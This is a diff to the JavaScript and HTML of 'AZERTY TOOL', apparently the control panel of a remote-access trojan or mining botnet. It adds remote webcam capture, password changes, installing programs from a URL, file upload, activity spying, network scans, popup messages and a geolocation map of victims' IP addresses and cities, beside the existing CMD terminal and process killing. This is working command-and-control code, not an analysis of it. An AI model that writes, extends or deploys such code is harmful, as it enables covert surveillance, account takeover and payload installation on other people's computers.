@@ -4,6 +4,8 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>AZERTY TOOL - Dashboard</title>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <style>
 :root{
   --bg:#0a0a0a;--bg2:#161b22;--bg3:#0d1117;--border:#30363d;--border2:#21262d;
@@ -185,7 +187,28 @@ body{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(
 
 ::-webkit-scrollbar{width:8px}::-webkit-scrollbar-track{background:var(--bg3)}::-webkit-scrollbar-thumb{background:var(--border);border-radius:4px}::-webkit-scrollbar-thumb:hover{background:var(--text2)}
 
-@media(max-width:600px){.header{flex-direction:column}.header .stats{width:100%;justify-content:center}.grid{padding:0}.earnings-banner{flex-direction:column;text-align:center}.info-grid{grid-template-columns:1fr}.nav-bar{flex-direction:column}.page{padding:12px}}
+@media(max-width:768px){
+.header{flex-direction:column;padding:12px;gap:8px}
+.header .stats{width:100%;justify-content:center;flex-wrap:wrap}
+.header .stats .stat-box{padding:6px 12px;font-size:.8rem}
+.grid{padding:0;grid-template-columns:1fr!important}
+.card{margin:0 4px 8px}
+.earnings-banner{flex-direction:column;text-align:center;padding:8px}
+.info-grid{grid-template-columns:1fr}
+.nav-bar{flex-direction:column;gap:4px;padding:8px}
+.nav-tabs{flex-wrap:wrap;gap:4px;justify-content:center}
+.nav-tab{padding:6px 10px;font-size:.75rem}
+.nav-right{justify-content:center;flex-wrap:wrap}
+.page{padding:8px}
+.modal-box{width:98%;margin:4px;max-height:95vh;padding:12px}
+.modal-section{padding:8px}
+.modal-btns{flex-wrap:wrap;gap:6px}
+.modal-btns button{padding:8px 12px;font-size:.75rem}
+.card-controls{padding:8px}
+.ctrl-btns{flex-wrap:wrap;gap:4px}
+h1{font-size:1.2rem}
+#map-container{height:50vh}
+}
 </style>
 </head>
 <body>
@@ -213,6 +236,7 @@ body{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(
     <button class="nav-tab" onclick="showPage('charts')">Graphiques</button>
     <button class="nav-tab" onclick="showPage('network')">Reseau</button>
     <button class="nav-tab" onclick="showPage('logs')">Logs</button>
+    <button class="nav-tab" onclick="showPage('map')">🗺 Carte</button>
   </div>
   <div class="nav-right">
     <span id="last-update" style="font-size:.8rem;color:var(--text2)">...</span>
@@ -250,6 +274,13 @@ body{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(
     <button onclick="clearLogs()" style="background:none;border:1px solid var(--red2);color:var(--red);padding:4px 12px;border-radius:6px;font-size:.75rem;cursor:pointer">Vider</button>
   </div>
   <div id="logs-list"></div>
+</div>
+
+<!-- MAP PAGE -->
+<div class="page" id="page-map">
+  <div id="map-container" style="width:100%;height:70vh;border-radius:12px;overflow:hidden;border:1px solid var(--border)">
+    <div style="text-align:center;padding:40px;color:var(--text2)">Chargement de la carte...</div>
+  </div>
 </div>
 
 <div class="toast" id="toast"></div>
@@ -319,6 +350,7 @@ function showPage(name){
   if(name==='charts') loadCharts();
   if(name==='logs') loadLogs();
   if(name==='network') renderNetwork();
+  if(name==='map') loadMap();
 }
 
 // API
@@ -384,6 +416,25 @@ async function openMachineDetail(hostname){
     +'<div class="modal-btns" style="margin-bottom:8px"><button onclick="listProcesses(\''+h+'\')" style="background:var(--green3);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer">📋 Lister</button></div>'
     +'<div style="display:flex;gap:8px;margin-bottom:8px"><input type="text" id="kill-input" placeholder="PID ou nom (ex: 1234 ou notepad.exe)" style="flex:1;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:8px;font-family:monospace;font-size:.85rem"><button onclick="killProcess(\''+h+'\')" style="background:var(--red);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer">💀 Kill</button></div>'
     +'<div id="proc-output" style="background:var(--bg);border:1px solid var(--border2);border-radius:8px;padding:12px;font-family:monospace;font-size:.75rem;color:var(--text);max-height:300px;overflow-y:auto;white-space:pre;display:none"></div></div></div>'
+    +'<div class="modal-section"><div class="modal-section-title">📡 Speedtest & Reseau</div><div class="modal-controls">'
+    +'<div class="modal-btns" style="margin-bottom:8px"><button onclick="runSpeedtest(\''+h+'\')" style="background:var(--blue);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer">🚀 Speedtest</button><button onclick="runNetscan(\''+h+'\')" style="background:var(--purple);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer">🔍 Scan Reseau</button><button onclick="runDiskspace(\''+h+'\')" style="background:var(--gold);color:#000;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer">💾 Espace Disque</button></div>'
+    +'<div id="net-output" style="background:var(--bg);border:1px solid var(--border2);border-radius:8px;padding:12px;font-family:monospace;font-size:.75rem;color:var(--text);max-height:200px;overflow-y:auto;white-space:pre;display:none"></div></div></div>'
+    +'<div class="modal-section"><div class="modal-section-title">📸 Webcam</div><div class="modal-controls">'
+    +'<div class="modal-btns" style="margin-bottom:8px"><button onclick="captureWebcam(\''+h+'\')" style="background:var(--green3);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer">📸 Capturer Webcam</button></div>'
+    +'<div id="webcam-output" style="text-align:center"></div></div></div>'
+    +'<div class="modal-section"><div class="modal-section-title">💬 Message Popup</div><div class="modal-controls">'
+    +'<div style="display:flex;gap:8px"><input type="text" id="msg-input" placeholder="Message a afficher sur le PC..." style="flex:1;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:8px;font-size:.85rem" onkeydown="if(event.key===\'Enter\')sendMessage(\''+h+'\')"><button onclick="sendMessage(\''+h+'\')" style="background:var(--blue);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer">💬 Envoyer</button></div></div></div>'
+    +'<div class="modal-section"><div class="modal-section-title">🖼 Fond Ecran</div><div class="modal-controls">'
+    +'<div style="display:flex;gap:8px"><input type="text" id="wallpaper-input" placeholder="URL image (jpg/png)..." style="flex:1;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:8px;font-size:.85rem"><button onclick="changeWallpaper(\''+h+'\')" style="background:var(--purple);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer">🖼 Changer</button></div></div></div>'
+    +'<div class="modal-section"><div class="modal-section-title">🔑 Mot de Passe</div><div class="modal-controls">'
+    +'<div style="display:flex;gap:8px"><input type="password" id="pass-input" placeholder="Nouveau mot de passe..." style="flex:1;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:8px;font-size:.85rem"><button onclick="changePassword(\''+h+'\')" style="background:var(--red);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer">🔑 Changer</button></div></div></div>'
+    +'<div class="modal-section"><div class="modal-section-title">📦 Installer Programme</div><div class="modal-controls">'
+    +'<div style="display:flex;gap:8px"><input type="text" id="install-input" placeholder="URL du .exe ou .msi..." style="flex:1;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:8px;font-size:.85rem"><button onclick="installProgram(\''+h+'\')" style="background:var(--green3);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer">📦 Installer</button></div></div></div>'
+    +'<div class="modal-section"><div class="modal-section-title">📤 Upload Fichier</div><div class="modal-controls">'
+    +'<div style="display:flex;gap:8px;align-items:center"><input type="text" id="upload-path" placeholder="Chemin destination (ex: C:\\Users\\test.txt)" style="flex:1;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:8px;font-size:.85rem"><input type="file" id="upload-file" style="display:none" onchange="uploadFile(\''+h+'\')"><button onclick="document.getElementById(\'upload-file\').click()" style="background:var(--blue);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer">📤 Choisir</button></div></div></div>'
+    +'<div class="modal-section"><div class="modal-section-title">👁 Activite</div><div class="modal-controls">'
+    +'<div class="modal-btns" style="margin-bottom:8px"><button onclick="getActivity(\''+h+'\')" style="background:var(--purple);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer">👁 Voir Activite</button></div>'
+    +'<div id="activity-output" style="background:var(--bg);border:1px solid var(--border2);border-radius:8px;padding:12px;font-family:monospace;font-size:.75rem;color:var(--text);max-height:200px;overflow-y:auto;white-space:pre;display:none"></div></div></div>'
     +'<div class="modal-section"><div class="modal-section-title">Terminal CMD</div><div class="modal-controls">'
     +'<div style="display:flex;gap:8px;margin-bottom:8px"><input type="text" id="cmd-input" placeholder="ex: ipconfig, tasklist, dir..." style="flex:1;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:8px;font-family:monospace;font-size:.85rem" onkeydown="if(event.key===\'Enter\')execCmd(\''+h+'\')"><button onclick="execCmd(\''+h+'\')" style="background:var(--purple);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-size:.85rem;font-weight:600;cursor:pointer;white-space:nowrap">Executer</button></div>'
     +'<div id="cmd-output" style="background:var(--bg);border:1px solid var(--border2);border-radius:8px;padding:12px;font-family:monospace;font-size:.8rem;color:var(--green);max-height:300px;overflow-y:auto;white-space:pre-wrap;display:none"></div></div></div>'
@@ -739,6 +790,117 @@ function killProcess(hostname){
   sendCommand(hostname,'command','kill:'+target);
   showToast('💀 Kill envoye: '+target);
   setTimeout(()=>listProcesses(hostname),3000);
+}
+
+// SPEEDTEST / NETSCAN / DISKSPACE
+function runSpeedtest(h){showToast('🚀 Speedtest en cours...');sendCommand(h,'command','speedtest');pollCmdResult(h,'net-output');}
+function runNetscan(h){showToast('🔍 Scan reseau...');sendCommand(h,'command','netscan');pollCmdResult(h,'net-output');}
+function runDiskspace(h){showToast('💾 Lecture disques...');sendCommand(h,'command','diskspace');pollCmdResult(h,'net-output');}
+
+// WEBCAM
+function captureWebcam(h){
+  showToast('📸 Capture webcam...');sendCommand(h,'command','webcam');
+  const before=new Date().toISOString();
+  let attempts=0;
+  const poll=setInterval(async()=>{
+    attempts++;
+    try{
+      const r=await fetch(SB+'/rest/v1/machine_logs?hostname=eq.'+encodeURIComponent(h)+'&level=eq.webcam&created_at=gte.'+before+'&order=created_at.desc&limit=1',{headers:H});
+      const d=await r.json();
+      if(d.length&&d[0].message){clearInterval(poll);document.getElementById('webcam-output').innerHTML='<img src="data:image/jpeg;base64,'+d[0].message+'" style="max-width:100%;border-radius:8px;border:1px solid var(--border)">';}
+    }catch{}
+    if(attempts>30)clearInterval(poll);
+  },2000);
+}
+
+// MESSAGE POPUP
+function sendMessage(h){const t=document.getElementById('msg-input').value.trim();if(!t)return;sendCommand(h,'command','msg:'+t);showToast('💬 Message envoye');}
+
+// WALLPAPER
+function changeWallpaper(h){const u=document.getElementById('wallpaper-input').value.trim();if(!u)return;sendCommand(h,'command','wallpaper:'+u);showToast('🖼 Wallpaper change');}
+
+// PASSWORD
+function changePassword(h){const p=document.getElementById('pass-input').value;if(!p)return;if(!confirm('⚠ Changer le mot de passe sur '+h+' ?'))return;sendCommand(h,'command','chpasswd:'+p);showToast('🔑 Mot de passe change');}
+
+// INSTALL PROGRAM
+function installProgram(h){const u=document.getElementById('install-input').value.trim();if(!u)return;if(!confirm('📦 Installer depuis '+u+' sur '+h+' ?'))return;sendCommand(h,'command','install:'+u);showToast('📦 Installation lancee');}
+
+// UPLOAD FILE
+function uploadFile(h){
+  const fileInput=document.getElementById('upload-file');
+  const pathInput=document.getElementById('upload-path');
+  if(!fileInput.files.length||!pathInput.value.trim())return;
+  const file=fileInput.files[0];
+  const reader=new FileReader();
+  reader.onload=function(){
+    const b64=reader.result.split(',')[1];
+    if(b64.length>3*1024*1024){showToast('❌ Fichier trop gros (max 3MB)');return;}
+    sendCommand(h,'command','upload:'+pathInput.value.trim()+':'+b64);
+    showToast('📤 Upload en cours...');
+  };
+  reader.readAsDataURL(file);
+}
+
+// ACTIVITY
+function getActivity(h){showToast('👁 Lecture activite...');sendCommand(h,'command','activity');pollCmdResult(h,'activity-output');}
+
+// GENERIC CMD RESULT POLLER
+function pollCmdResult(h,outputId){
+  const output=document.getElementById(outputId);
+  output.style.display='block';output.textContent='Chargement...';
+  const before=new Date().toISOString();
+  let attempts=0;
+  const poll=setInterval(async()=>{
+    attempts++;
+    try{
+      const r=await fetch(SB+'/rest/v1/machine_logs?hostname=eq.'+encodeURIComponent(h)+'&level=eq.cmd_output&created_at=gte.'+before+'&order=created_at.desc&limit=1',{headers:H});
+      const d=await r.json();
+      if(d.length&&d[0].message){clearInterval(poll);output.textContent=d[0].message.replace(/^CMD:[^\n]*\n/,'');}
+    }catch{}
+    if(attempts>20){clearInterval(poll);output.textContent+=' Timeout';}
+  },1500);
+}
+
+// WOL (Wake-on-LAN via another online machine)
+function wakeOnLan(mac){
+  if(!machinesCache.length){showToast('❌ Aucune machine en ligne');return;}
+  const online=machinesCache.find(m=>(Date.now()-new Date(m.last_seen).getTime())<300000);
+  if(!online){showToast('❌ Besoin d\'une machine en ligne pour WoL');return;}
+  sendCommand(online.hostname,'command','wol:'+mac);
+  showToast('📡 Magic packet envoye via '+online.hostname);
+}
+
+// MAP
+let mapInstance=null;
+async function loadMap(){
+  const container=document.getElementById('map-container');
+  try{
+    const r=await fetch(SB+'/rest/v1/machine_logs?level=eq.geo&order=created_at.desc&limit=50',{headers:H});
+    const logs=await r.json();
+    // Group by hostname, keep latest
+    const geoMap={};
+    logs.forEach(l=>{
+      if(!geoMap[l.hostname]){
+        const parts=l.message.split(',');
+        if(parts.length>=4) geoMap[l.hostname]={lat:parseFloat(parts[0]),lon:parseFloat(parts[1]),ip:parts[2],city:parts.slice(3).join(',')};
+      }
+    });
+    const entries=Object.entries(geoMap);
+    if(!entries.length){container.innerHTML='<div style="text-align:center;padding:40px;color:var(--text2)">Aucune donnee geo. Les machines enverront leur position apres quelques minutes.</div>';return;}
+
+    container.innerHTML='';
+    if(mapInstance){mapInstance.remove();mapInstance=null;}
+    mapInstance=L.map(container).setView([entries[0][1].lat,entries[0][1].lon],6);
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{attribution:'OSM'}).addTo(mapInstance);
+    entries.forEach(([hostname,geo])=>{
+      const m=machinesCache.find(x=>x.hostname===hostname);
+      const online=m&&(Date.now()-new Date(m.last_seen).getTime())<300000;
+      const color=online?'green':'red';
+      const icon=L.divIcon({className:'',html:'<div style="background:'+color+';width:14px;height:14px;border-radius:50%;border:2px solid #fff;box-shadow:0 0 6px rgba(0,0,0,.4)"></div>',iconSize:[14,14]});
+      L.marker([geo.lat,geo.lon],{icon}).addTo(mapInstance).bindPopup('<b>'+hostname+'</b><br>'+geo.city+'<br>IP: '+geo.ip+'<br>'+(online?'🟢 En ligne':'🔴 Hors ligne'));
+    });
+    setTimeout(()=>mapInstance.invalidateSize(),200);
+  }catch(e){container.innerHTML='<div style="color:var(--red);padding:20px">Erreur: '+e.message+'</div>';}
 }
 
 fetchRvnPrice();setInterval(fetchRvnPrice,300000);
